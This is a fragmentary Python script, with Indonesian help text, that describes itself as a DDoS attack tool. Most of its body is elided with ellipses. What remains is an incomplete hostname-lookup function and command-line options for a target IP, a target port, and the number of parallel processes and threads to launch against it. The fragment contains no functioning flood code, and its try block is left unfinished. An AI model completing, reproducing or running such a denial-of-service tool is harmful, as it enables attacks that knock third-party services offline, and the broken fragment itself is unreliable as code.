...
async def ip_info(ip_address, port, num_processes, num_threads_per_process):
    try:
        ...
        print(f"Nama host tidak dapat diselesaikan :")
        return
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(description='Skrip DDoS - Serangan Destroit Denial of Service (DDoS). ')
    parser.add_argument('-ip', required=True, help='IP address Target')
    parser.add_argument('-p', required=True, type=int, help='Nomor port target ')
    parser.add_argument('-pr', default=30, type=int, help='Jumlah proses yang akan dijalankan  parallel')
    parser.add_argument('-t', default=40, type=int, help='Jumlah threads per proses ')
    try:
